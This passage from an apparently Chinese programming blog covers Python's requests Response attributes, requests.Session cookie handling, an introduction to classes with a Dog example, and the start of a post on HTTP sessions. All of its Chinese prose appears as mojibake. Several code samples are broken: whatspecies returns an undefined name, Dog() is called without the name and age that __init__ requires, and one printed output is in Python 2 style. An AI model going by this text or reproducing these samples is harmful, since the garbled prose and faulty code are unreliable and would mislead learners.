<li>ç¤ºä¾‹ï¼š<code>response.status_code</code></li>
</ul>
</li>
<li><strong><code>text</code></strong><ul>
<li>å“åº”å†…å®¹çš„å­—ç¬¦ä¸²å½¢å¼ï¼ˆè‡ªåŠ¨æ ¹æ®å“åº”ç¼–ç è§£ç ï¼‰ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>response.text</code></li>
</ul>
</li>
<li><strong><code>content</code></strong><ul>
<li>å“åº”å†…å®¹çš„äºŒè¿›åˆ¶å½¢å¼ï¼ˆåŸå§‹å­—èŠ‚æµï¼‰ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>response.content</code></li>
</ul>
</li>
<li><strong><code>headers</code></strong><ul>
<li>ä»¥å­—å…¸å½¢å¼è¿”å›å“åº”å¤´ï¼ˆé”®ä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>response.headers[&#39;Content-Type&#39;]</code></li>
</ul>
</li>
<li><strong><code>url</code></strong><ul>
<li>æœ€ç»ˆè¯·æ±‚çš„ URLï¼ˆå¤„ç†é‡å®šå‘åï¼‰ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>response.url</code></li>
</ul>
</li>
<li><strong><code>encoding</code></strong><ul>
<li>å“åº”çš„ç¼–ç æ ¼å¼ï¼ˆå¯æ‰‹åŠ¨ä¿®æ”¹ä»¥ä¿®æ­£è§£ç é—®é¢˜ï¼‰ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>response.encoding = &#39;utf-8&#39;</code></li>
</ul>
</li>
<li><strong><code>cookies</code></strong><ul>
<li>æœåŠ¡å™¨è¿”å›çš„ Cookiesï¼ˆ<code>RequestsCookieJar</code> å¯¹è±¡ï¼‰ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>response.cookies.get(&#39;session_id&#39;)</code><br>ï¼ˆæ­¤å¤„ <code>get()</code> å¹¶é<code>requests.get()</code>ï¼Œç”¨äºä» cookies ä¸­è·å–æŒ‡å®šåç§°çš„ cookie å€¼ï¼‰</li>
</ul>
</li>
<li><strong><code>history</code></strong><ul>
<li>é‡å®šå‘å†å²è®°å½•ï¼ˆåˆ—è¡¨å½¢å¼ï¼ŒæŒ‰è¯·æ±‚é¡ºåºæ’åˆ—ï¼‰ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>response.history[0].status_code</code></li>
</ul>
</li>
</ol>
<h3 id="å¸¸ç”¨æ–¹æ³•"><a href="#å¸¸ç”¨æ–¹æ³•" class="headerlink" title="å¸¸ç”¨æ–¹æ³•"></a><strong>å¸¸ç”¨æ–¹æ³•</strong></h3><ol>
<li><strong><code>json()</code></strong><ul>
<li>å°† JSON å“åº”å†…å®¹è§£æä¸º Python å­—å…¸&#x2F;åˆ—è¡¨ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>data = response.json()</code></li>
</ul>
</li>
<li><strong><code>raise_for_status()</code></strong><ul>
<li>è‹¥çŠ¶æ€ç ä¸º 4xx&#x2F;5xxï¼ŒæŠ›å‡ºå¼‚å¸¸ï¼ˆç”¨äºé”™è¯¯å¤„ç†ï¼‰ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>response.raise_for_status()</code></li>
</ul>
</li>
</ol>
<h3 id="å…¶ä»–å±æ€§"><a href="#å…¶ä»–å±æ€§" class="headerlink" title="å…¶ä»–å±æ€§"></a><strong>å…¶ä»–å±æ€§</strong></h3><ol>
<li><strong><code>request</code></strong><ul>
<li>è¿”å›å¯¹åº”çš„è¯·æ±‚å¯¹è±¡ï¼ˆåŒ…å«è¯·æ±‚æ–¹æ³•ã€URLã€å¤´ä¿¡æ¯ç­‰ï¼‰ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>response.request.method</code></li>
</ul>
</li>
<li><strong><code>elapsed</code></strong><ul>
<li>è¯·æ±‚è€—æ—¶ï¼ˆ<code>datetime.timedelta</code> å¯¹è±¡ï¼‰ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>response.elapsed.total_seconds()</code></li>
</ul>
</li>
<li><strong><code>reason</code></strong><ul>
<li>çŠ¶æ€ç çš„æ–‡æœ¬æè¿°ï¼ˆå¦‚ <code>200</code> çš„ <code>reason</code> æ˜¯ <code>OK</code>ï¼‰ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>response.reason</code></li>
</ul>
</li>
<li><strong><code>is_redirect</code></strong><ul>
<li>å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦é‡å®šå‘ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>if response.is_redirect: ...</code></li>
</ul>
</li>
<li><strong><code>apparent_encoding</code></strong><ul>
<li>é€šè¿‡å†…å®¹æ¨æ–­çš„ç¼–ç æ ¼å¼ï¼ˆæ¯” <code>encoding</code> æ›´å¯é ï¼‰ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>response.encoding = response.apparent_encoding</code></li>
</ul>
</li>
<li><strong><code>raw</code></strong><ul>
<li>åŸå§‹å“åº”æµï¼ˆéœ€åœ¨è¯·æ±‚ä¸­è®¾ç½® <code>stream=True</code>ï¼‰ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>response.raw.read(10)</code></li>
</ul>
</li>
</ol>
<h2 id="å…¶ä»–çŸ¥è¯†ç‚¹"><a href="#å…¶ä»–çŸ¥è¯†ç‚¹" class="headerlink" title="å…¶ä»–çŸ¥è¯†ç‚¹"></a>å…¶ä»–çŸ¥è¯†ç‚¹</h2><h3 id="requests-Session"><a href="#requests-Session" class="headerlink" title="requests.Session()"></a><strong>requests.Session()</strong></h3><p>Python çš„ <code>requests.Session()</code> æ˜¯<strong>å®¢æˆ·ç«¯çš„å·¥å…·</strong>ï¼ˆæ³¨æ„ä¸æœåŠ¡ç«¯çš„ Session åŒºåˆ†ï¼‰ï¼Œç›®çš„æ˜¯<strong>ç®€åŒ–å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯äº¤äº’æ—¶çš„çŠ¶æ€ç®¡ç†</strong>ã€‚å®ƒçš„æ ¸å¿ƒä½œç”¨æ˜¯ï¼š</p>
<p>**è‡ªåŠ¨ç®¡ç† Cookies **</p>
<ul>
<li><strong>è‡ªåŠ¨ä¿å­˜</strong>æœåŠ¡ç«¯é€šè¿‡ <code>Set-Cookie</code> è¿”å›çš„æ‰€æœ‰ Cookiesï¼ˆåŒ…æ‹¬ <code>session_id</code> ç­‰ï¼‰</li>
<li><strong>è‡ªåŠ¨æºå¸¦</strong>è¿™äº› Cookies å‘é€åç»­è¯·æ±‚</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå®¢æˆ·ç«¯ä¼šè¯ï¼ˆè‡ªåŠ¨ç®¡ç† Cookiesï¼‰</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.æœåŠ¡ç«¯è¿”å› Cookie å¹¶è‡ªåŠ¨ä¿å­˜åˆ° Session ä¸­</span></span><br><span class="line">session.post(<span class="string">&quot;https://example.com/login&quot;</span>, data=&#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;123&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.é€šè¿‡ session.get() è¿™æ ·çš„å½¢å¼ï¼Œè‡ªåŠ¨æºå¸¦ Cookieï¼ˆæ— éœ€æ‰‹åŠ¨å¤„ç† Cookie å¹¶æ·»åŠ åˆ° header ä¸­ï¼‰</span></span><br><span class="line">response = session.get(<span class="string">&quot;https://example.com/profile&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>å…¶ä»–åŠŸèƒ½</strong></p>
<ul>
<li><strong>è¿æ¥æ± ï¼ˆConnection Poolingï¼‰</strong>ï¼šå¤ç”¨ TCP è¿æ¥ï¼Œæå‡æ€§èƒ½</li>
<li><strong>ç»Ÿä¸€é…ç½®</strong>ï¼šé¢„å…ˆè®¾ç½® Headersã€Authã€Proxies ç­‰ï¼Œé€‚ç”¨äºæ‰€æœ‰è¯·æ±‚</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/24/Python-requests/" data-id="cm9wms3l90007kcuh6wbbhdiu" data-title="Python-requests" class="article-share-link"><span class="fa fa-share">åˆ†äº«</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/requests/" rel="tag">requests</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Python-é¢å‘å¯¹è±¡å…¥é—¨" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/" class="article-date">
  <time class="dt-published" datetime="2025-04-22T13:00:39.000Z" itemprop="datePublished">2025-04-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0/">ç¼–ç¨‹ç¬”è®°</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/">Python-é¢å‘å¯¹è±¡å…¥é—¨</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>æ¥çœ‹ä¸€ä¸ªç®€å•çš„å®šä¹‰ç±»çš„æ¡ˆä¾‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>:</span><br><span class="line">    <span class="comment"># ç±»å±æ€§</span></span><br><span class="line">    species = <span class="string">&#x27;çŠ¬ç§‘åŠ¨ç‰©&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ–¹æ³•ï¼šè¿”å›ç§ç±»</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">whatspecies</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> species</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ„é€ å‡½æ•°ï¼šåˆ›å»ºå°ç‹—æ—¶å¿…é¡»æä¾›åå­—å’Œå¹´é¾„</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name  <span class="comment"># å°ç‹—çš„åå­—ï¼ˆå±æ€§ï¼‰</span></span><br><span class="line">        <span class="variable language_">self</span>.age = age    <span class="comment"># å°ç‹—çš„å¹´é¾„ï¼ˆå±æ€§ï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ–¹æ³•ï¼šå°ç‹—åä¸‹</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> ä¹–ä¹–åä¸‹äº†ï¼&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç†è§£ä¸ºï¼Œå› ä¸ºè®¸å¤šå¯¹è±¡éƒ½æœ‰å…±åŒç‚¹ï¼Œå¯ä»¥æ ¹æ®å…±åŒç‚¹å¯¹å®ƒä»¬åˆ†ç±»ï¼Œæ‰€ä»¥æœ‰äº†â€œç±»â€ã€‚ä¸è¿‡ï¼Œå®è·µä¸­å¾€å¾€æ˜¯å®šä¹‰å¥½ç±»åï¼Œæ‰ä»¥å®šä¹‰å¥½çš„ç±»ä¸ºæ ‡å‡†ï¼Œâ€œåˆ›é€ â€å‡ºè®¸å¤šåŒä¸€ç±»çš„å¯¹è±¡ã€‚è¿™äº›è¢«â€œåˆ›é€ â€å‡ºæ¥çš„å¯¹è±¡ï¼Œç§°ä¸ºå®ä¾‹ã€‚ç”¨å®šä¹‰å¥½çš„ç±»â€œåˆ›é€ â€å¯¹è±¡çš„è¿‡ç¨‹ï¼Œç§°ä¸ºå®ä¾‹åŒ–ã€‚</p>
<h2 id="å±æ€§ä¸æ–¹æ³•ï¼Œå®ä¾‹åŒ–"><a href="#å±æ€§ä¸æ–¹æ³•ï¼Œå®ä¾‹åŒ–" class="headerlink" title="å±æ€§ä¸æ–¹æ³•ï¼Œå®ä¾‹åŒ–"></a>å±æ€§ä¸æ–¹æ³•ï¼Œå®ä¾‹åŒ–</h2><p>åœ¨ç±»ä¸­å¯ä»¥å®šä¹‰å±æ€§å’Œæ–¹æ³•ã€‚å¦‚ä¸Šé¢çš„ä»£ç æ®µåœ¨ç±» <code>Dog</code> ä¸­å®šä¹‰äº†å±æ€§ <code>species</code> å’Œæ–¹æ³• <code>whatspecies</code>ã€ <code>__init__</code> ã€<code>sit</code> ç­‰ã€‚</p>
<p>è¦è°ƒç”¨æŸä¸ªç±»çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡ <code>ç±»å.å±æ€§/æ–¹æ³•</code> è¿™æ ·çš„æ–¹å¼ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å®ä¾‹åŒ–ã€‚</p>
<p><strong>ç±»å.å±æ€§&#x2F;æ–¹æ³•</strong>ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(Dog().species) <span class="comment"># å…±è¾“å‡º2æ¬¡â€œçŠ¬ç§‘åŠ¨ç‰©â€</span></span><br><span class="line"><span class="built_in">print</span>(Dog().whatspecies()) <span class="comment"># å³ä½¿å®šä¹‰æ—¶çœç•¥äº†æ‹¬å·ï¼ŒDog()åœ¨æ­¤å¤„ä¹Ÿä¸èƒ½çœç•¥æ‹¬å·ï¼Œå¦åˆ™ä¸ä¼šè¢«å½“æˆç±»å</span></span><br></pre></td></tr></table></figure>

<p><strong>å®ä¾‹åŒ–</strong>ï¼š<br>å®ä¾‹åŒ–æ˜¯æŒ‡ç”¨å®šä¹‰å¥½çš„ç±»â€œåˆ›é€ â€å¯¹è±¡ï¼Œè®©ä¸åŒçš„å¯¹è±¡ï¼ˆå®ä¾‹ï¼‰æ¥è‡ªåŒä¸€ç±»ï¼Œå…±äº«ç±»ä¸­çš„å±æ€§ä¸æ–¹æ³•ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dog1 = Dog()</span><br><span class="line">dog2 = Dog()</span><br><span class="line"><span class="built_in">print</span>(dog1.species)</span><br><span class="line"><span class="built_in">print</span>(dog1.whatspecies())</span><br><span class="line"><span class="built_in">print</span>(dog2.species)</span><br><span class="line"><span class="built_in">print</span>(dog2.whatspecies()) <span class="comment"># å…±è¾“å‡º4æ¬¡â€œçŠ¬ç§‘åŠ¨ç‰©â€</span></span><br></pre></td></tr></table></figure>

<p>å¦å¤–ï¼Œå±æ€§çš„å®šä¹‰ä¸å˜é‡çš„å®šä¹‰ä¸€è‡´ï¼Œä¸è¿‡è¦è°ƒç”¨æ—¶éœ€è¦<code>ç±»å.å±æ€§</code>æˆ–å®ä¾‹åŒ–çš„æ–¹å¼ï¼›ä½†æ–¹æ³•ä¸å‡½æ•°çš„å®šä¹‰æœ‰ä¸€ç‚¹ä¸åŒï¼š<strong>å¿…é¡»æœ‰ä¸€ä¸ªé¢å¤–çš„ç¬¬ä¸€ä¸ªå‚æ•°åç§°, æŒ‰ç…§æƒ¯ä¾‹å®ƒçš„åç§°æ˜¯ self</strong> ï¼ˆåé¢ä¼šç»†è®²ï¼‰ã€‚</p>
<h2 id="init-æ–¹æ³•"><a href="#init-æ–¹æ³•" class="headerlink" title="__init__ æ–¹æ³•"></a><code>__init__</code> æ–¹æ³•</h2><p>ä¸Šé¢çš„å®ä¾‹åŒ–æ˜¯ç›´æ¥è¿›è¡Œå®ä¾‹åŒ–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ <code>__init__()</code> æ–¹æ³•å®ä¾‹åŒ–ç±»ã€‚å¦‚ä¸Šé¢æ¡ˆä¾‹ä¸­çš„ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>:</span><br><span class="line">    <span class="comment"># æ„é€ å‡½æ•°ï¼šåˆ›å»ºå°ç‹—æ—¶å¿…é¡»æä¾›åå­—å’Œå¹´é¾„</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name  <span class="comment"># å°ç‹—çš„åå­—ï¼ˆå±æ€§ï¼‰</span></span><br><span class="line">        <span class="variable language_">self</span>.age = age    <span class="comment"># å°ç‹—çš„å¹´é¾„ï¼ˆå±æ€§ï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ–¹æ³•ï¼šå°ç‹—åä¸‹</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> ä¹–ä¹–åä¸‹äº†ï¼&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>åŠŸèƒ½</strong>ï¼šåœ¨åˆ›å»ºä¸€ä¸ªç±»çš„å®ä¾‹ï¼ˆå¯¹è±¡ï¼‰æ—¶ï¼Œ<code>__init__</code> æ–¹æ³•ä¼šè¢«<strong>è‡ªåŠ¨è°ƒç”¨</strong>ï¼Œç”¨äºä¸ºå¯¹è±¡è®¾ç½®åˆå§‹å±æ€§ã€‚</p>
<p>å¯¹æ¯”ä¸€ä¸‹æœ‰æ—  <code>__init__</code> æ–¹æ³•çš„ä¸¤ç§æƒ…å†µï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dog1 = Dog(<span class="string">&quot;å¤§é»„&quot;</span>, <span class="number">10</span>)  <span class="comment"># åˆ›å»ºå¯¹è±¡æ—¶ç›´æ¥ä¼ å…¥å±æ€§å€¼</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dog1 = Dog()</span><br><span class="line">dog1.name = <span class="string">&quot;å¤§é»„&quot;</span>  <span class="comment"># æ‰‹åŠ¨æ·»åŠ å±æ€§</span></span><br><span class="line">dog1.age = <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ <code>Dog(&quot;å¤§é»„&quot;, 10)</code> åˆ†åˆ«ä¼ å‚ç»™ <code>name </code>ä¸ <code>age</code> ä¸¤ä¸ªå±æ€§ï¼Œå†åœ¨ <code>__init__</code> æ–¹æ³•ä¸­æˆä¸ºå®ä¾‹ <code>dog1</code> çš„å®ä¾‹å±æ€§ï¼ˆ <code>self</code> è¡¨ç¤ºå®ä¾‹æœ¬èº«ï¼‰ã€‚</p>
<p><strong>å…³äºå®ä¾‹å±æ€§ä¸ç±»å±æ€§</strong>ï¼šç±»å±æ€§å¯è¢«æ‰€æœ‰å±äºè¯¥ç±»çš„å¯¹è±¡è°ƒç”¨ï¼ˆç±»ä¼¼ <code>dog1.species</code> ï¼Œæ‰€æœ‰è¯¥ç±»å®ä¾‹çš„ <code>species</code> å±æ€§éƒ½æ˜¯â€œçŠ¬ç§‘åŠ¨ç‰©â€ï¼‰ï¼Œå®ä¾‹å±æ€§åˆ™åªèƒ½é€šè¿‡è¯¥å®ä¾‹è°ƒç”¨ï¼ˆ<code>dog1.name</code>ï¼‰ã€‚</p>
<p><strong>å…³äº <code>self</code></strong><br><code>self</code> ä»£è¡¨ç±»çš„å®ä¾‹ï¼Œè€Œéç±»æœ¬èº«ã€‚ç±»çš„æ–¹æ³•ç›¸æ¯”æ™®é€šå‡½æ•°åªæœ‰ä¸€ä¸ªç‰¹åˆ«çš„åŒºåˆ«ï¼šå®ƒä»¬å¿…é¡»æœ‰ä¸€ä¸ªé¢å¤–çš„ç¬¬ä¸€ä¸ªå‚æ•°åç§°, æŒ‰ç…§æƒ¯ä¾‹å®ƒçš„åç§°æ˜¯ <code>self</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">prt</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>.__class__)</span><br><span class="line"></span><br><span class="line">t = Test()</span><br><span class="line">t.prt()</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šå®ä¾‹æ‰§è¡Œç»“æœä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;__main__.Test instance at 0x100771878&gt;</span><br><span class="line">__main__.Test</span><br></pre></td></tr></table></figure>

<p>ä»æ‰§è¡Œç»“æœå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºï¼Œ<code>self</code> ä»£è¡¨çš„æ˜¯ç±»çš„å®ä¾‹ï¼Œ<strong>ä»£è¡¨å½“å‰å¯¹è±¡çš„åœ°å€</strong>ï¼Œè€Œ <code>self.class</code> åˆ™æŒ‡å‘ç±»ã€‚<br> ç”±äº <code>self</code> å¹¶éå…³é”®å­—ï¼Œæ‰€ä»¥å¯ä»¥å°† <code>self</code> æ›¿æ¢æˆå…¶ä»–çš„å…³é”®å­—ï¼Œä¹Ÿä¸ä¼šå‡ºç°é—®é¢˜ã€‚<br>åœ¨ Pythonä¸­ï¼Œ<code>self</code> æ˜¯ä¸€ä¸ªæƒ¯ç”¨çš„åç§°ï¼Œç”¨äºè¡¨ç¤ºç±»çš„å®ä¾‹ï¼ˆå¯¹è±¡ï¼‰è‡ªèº«ã€‚å®ƒæ˜¯ä¸€ä¸ªæŒ‡å‘å®ä¾‹çš„å¼•ç”¨ï¼Œä½¿å¾—ç±»çš„æ–¹æ³•èƒ½å¤Ÿè®¿é—®å’Œæ“ä½œå®ä¾‹çš„å±æ€§ã€‚<br>å½“ä½ å®šä¹‰ä¸€ä¸ªç±»ï¼Œå¹¶åœ¨ç±»ä¸­å®šä¹‰æ–¹æ³•æ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°é€šå¸¸è¢«å‘½åä¸º <code>self</code>ï¼Œå°½ç®¡ä½ å¯ä»¥ä½¿ç”¨å…¶ä»–åç§°ï¼Œä½†å¼ºçƒˆå»ºè®®ä½¿ç”¨ <code>self</code>ï¼Œä»¥ä¿æŒä»£ç çš„ä¸€è‡´æ€§å’Œå¯è¯»æ€§</p>
<h2 id="æ ¸å¿ƒæ¦‚å¿µè§£æ"><a href="#æ ¸å¿ƒæ¦‚å¿µè§£æ" class="headerlink" title="æ ¸å¿ƒæ¦‚å¿µè§£æ"></a>æ ¸å¿ƒæ¦‚å¿µè§£æ</h2><ol>
<li><p><strong>å°è£…</strong>ï¼šæŠŠæ•°æ®ï¼ˆå±æ€§ï¼‰å’Œæ“ä½œï¼ˆæ–¹æ³•ï¼‰æ‰“åŒ…åœ¨ä¸€èµ·</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my_dog.age += <span class="number">1</span>  <span class="comment"># ç›´æ¥ä¿®æ”¹å±æ€§</span></span><br><span class="line">my_dog.sit()  <span class="comment"># è°ƒç”¨æ–¹æ³•</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>ç»§æ‰¿</strong>ï¼šå­ç±»ç»§æ‰¿çˆ¶ç±»çš„ç‰¹æ€§ï¼ˆæ¯”å¦‚å¯¼ç›²çŠ¬æ˜¯ç‰¹æ®Šçš„å°ç‹—ï¼‰</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GuideDog</span>(<span class="title class_ inherited__">Dog</span>):  <span class="comment"># ç»§æ‰¿è‡ªDogç±»</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">guide</span>(<span class="params">self</span>):</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> æ­£åœ¨å¼•å¯¼ä¸»äººï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line">guide_dog = GuideDog(<span class="string">&quot;å¤§é»„&quot;</span>, <span class="number">4</span>)</span><br><span class="line">guide_dog.sit()      <span class="comment"># ç»§æ‰¿çˆ¶ç±»æ–¹æ³•</span></span><br><span class="line">guide_dog.guide()    <span class="comment"># å­ç±»æ–°å¢æ–¹æ³•</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>å¤šæ€</strong>ï¼šä¸åŒå¯¹è±¡å¯¹åŒä¸€æ–¹æ³•æœ‰ä¸åŒçš„å“åº”ï¼ˆæ¯”å¦‚çŒ«ç‹—çš„å«æ³•ä¸åŒï¼‰</p>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/" data-id="cm9wms3l80006kcuh77fn7nes" data-title="Python-é¢å‘å¯¹è±¡å…¥é—¨" class="article-share-link"><span class="fa fa-share">åˆ†äº«</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" rel="tag">é¢å‘å¯¹è±¡</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Session" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/20/Session/" class="article-date">
  <time class="dt-published" datetime="2025-04-20T12:55:59.000Z" itemprop="datePublished">2025-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">æ‚é¡¹çŸ¥è¯†ç‚¹</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/20/Session/">Session</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="HTTP-æ— çŠ¶æ€æ€§çš„æ ¸å¿ƒé—®é¢˜"><a href="#HTTP-æ— çŠ¶æ€æ€§çš„æ ¸å¿ƒé—®é¢˜" class="headerlink" title="HTTP æ— çŠ¶æ€æ€§çš„æ ¸å¿ƒé—®é¢˜"></a>HTTP æ— çŠ¶æ€æ€§çš„æ ¸å¿ƒé—®é¢˜</h2><p>HTTP åè®®æœ¬èº« <strong>ä¸ä¼šè®°ä½ç”¨æˆ·ä¸Šä¸€æ¬¡çš„è¯·æ±‚</strong>ï¼Œæ¯ä¸ªè¯·æ±‚éƒ½æ˜¯ç‹¬ç«‹çš„ã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li><strong>é—®é¢˜</strong>ï¼šç”¨æˆ·ç™»å½•åï¼Œè·³è½¬åˆ°å…¶ä»–é¡µé¢æ—¶ï¼ŒæœåŠ¡å™¨æ— æ³•è‡ªåŠ¨è¯†åˆ«è¿™æ˜¯åŒä¸€ä¸ªç”¨æˆ·ã€‚</li>
